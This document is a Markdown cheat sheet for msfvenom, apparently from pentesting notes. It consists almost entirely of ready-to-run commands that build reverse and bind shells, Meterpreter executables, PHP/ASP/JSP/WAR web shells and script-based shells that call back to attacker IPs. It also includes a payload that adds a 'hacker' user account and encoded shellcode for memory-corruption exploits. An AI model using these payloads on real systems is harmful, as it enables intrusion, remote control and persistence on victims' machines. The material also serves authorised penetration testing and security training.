# Msfvenom

## List Payloads

You may list payloads with the following command:

```text
msfvenom --list payloads
```

## Staged and Stageless

Windows Staged reverse TCP

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

Windows Stageless reverse TCP

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

Linux Staged reverse TCP

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

Linux Stageless reverse TCP

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

### Windows Payloads <a id="windows-payloads"></a>

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

### Linux Payloads <a id="linux-payloads"></a>

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```

Add a user in windows with msfvenom:

```text
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

## Web Payloads

PHP

```text
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '' > shell.php && pbpaste >> shell.php
```

ASP

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

JSP

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

WAR

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

## Scripting Payloads

Python

```text
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

Bash

```text
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

Perl

```text
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

PowerShell

```text
msfvenom -p windows/x64/powershell_reverse_tcp -o psh.ps1 -a x64 --platform windows LHOST=192.168.88.251 LPORT=8080
```

## Memory Corruption Payloads

Creating a msfvenom payload with an encoder while removing bad characters:

```text
# Try without specifying shikata_ga_nai to avoid an output error, shikata_ga_nai is the default encoding anyway.
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -f c EXITFUNC=thread

# Try with shikata_ga_nai
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
msfvenom -a x64 --platform windows -p windows/shell_reverse_tcp LHOST=10.10.10.20 LPORT=443 -b "\x00" -e x86/shikata_ga_nai -f c EXITFUNC=thread
```

## Library Payloads

You may list libraries with the following command:

```text
msfvenom --list payloads | grep -i library
```

### DLL Payloads

You can list the payloads that use DLLs with the following command:

```text
msfvenom --list payloads | grep -i DLL
```

## List Formats

```text
❯ msfvenom --list formats

Framework Executable Formats [--format <value>]
===============================================

    Name
    ----
    asp
    aspx
    aspx-exe
    axis2
    dll
    elf
    elf-so
    exe
    exe-only
    exe-service
    exe-small
    hta-psh
    jar
    jsp
    loop-vbs
    macho
    msi
    msi-nouac
    osx-app
    psh
    psh-cmd
    psh-net
    psh-reflection
    python-reflection
    vba
    vba-exe
    vba-psh
    vbs
    war

Framework Transform Formats [--format <value>]
==============================================

    Name
    ----
    base32
    base64
    bash
    c
    csharp
    dw
    dword
    hex
    java
    js_be
    js_le
    num
    perl
    pl
    powershell
    ps1
    py
    python
    raw
    rb
    ruby
    sh
    vbapplication
    vbscript
```

